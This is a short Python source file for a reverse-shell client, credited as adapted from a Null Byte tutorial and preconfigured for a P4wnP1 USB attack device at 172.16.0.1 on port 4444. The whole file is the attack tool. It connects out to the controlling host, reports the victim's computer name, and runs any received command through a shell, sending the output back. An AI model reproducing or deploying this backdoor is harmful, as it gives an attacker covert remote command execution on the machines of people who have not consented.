# nullByte client shell
# source : https://null-byte.wonderhowto.com/how-to/reverse-shell-using-python-0163875/
# corrected, modified by BeBoX
# preconfigured to work with P4wnP1 over Rndis usb default IP
# fixed bug of null byte in args
import socket, os, subprocess
def connect():
    os.system('cls')
    global host
    global port
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 4444
    host = '172.16.0.1'
    try:
        print('[!] trying to connect to %s:%s'%(host,port))
        s.connect((host,port))
        print('[*] Connection established.')
        nom = os.environ['COMPUTERNAME']
        my_str_as_bytes = str.encode(nom)
        s.send(my_str_as_bytes)
    except socket.error as msg:
        print('Could not connect. :'+ str(msg[0]))
def receive():
    #print('receive debug ...')
    receive = s.recv(1024).decode()
    if receive == 'quit':
        s.close()
        exit()
    elif receive[0:5] == 'shell':
        proc2 = subprocess.Popen(receive[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc2.stdout.read() + proc2.stderr.read()
        args = stdout_value 
        if len(args) == 0 :
            args = str.encode(' ')
    else:
        args = str.encode('no valid input was given.')    
    send(args)
def send(args):
    send = s.send(args)
    receive()
connect()
receive()
s.close()
